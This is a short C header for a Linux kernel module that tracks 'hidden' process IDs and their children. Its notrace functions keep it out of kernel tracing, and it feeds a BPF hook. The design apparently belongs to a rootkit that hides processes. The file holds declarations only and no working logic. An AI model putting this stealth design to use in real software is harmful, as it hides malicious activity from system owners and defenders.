#ifndef BAT_PID_MANAGER_H
#define BAT_PID_MANAGER_H

#include <linux/types.h>

#define MAX_HIDDEN_PIDS  32
#define MAX_CHILD_PIDS   (MAX_HIDDEN_PIDS * 128)

/* Arrays exported for NMI-safe lockless reads in bpf_hook */
extern int hidden_pids[MAX_HIDDEN_PIDS];
extern int child_pids[MAX_CHILD_PIDS];
extern int hidden_count;
extern int child_count;
extern u64 hidden_start_times[MAX_HIDDEN_PIDS];
extern u64 child_start_times[MAX_CHILD_PIDS];

/* PID management */
notrace void add_hidden_pid(int pid);
notrace void del_hidden_pid(int pid);
notrace void add_child_pid(int pid);
notrace int  is_hidden_pid(int pid);
notrace int  is_child_pid(int pid);
notrace int  hidden_pid_count(void);
notrace int  child_pid_count(void);
notrace int  hidden_pids_snapshot(int *dst, int max_entries);
notrace int  child_pids_snapshot(int *dst, int max_entries);

/* Module init/exit */
int  pid_manager_init(void);
void pid_manager_exit(void);

#endif /* BAT_PID_MANAGER_H */
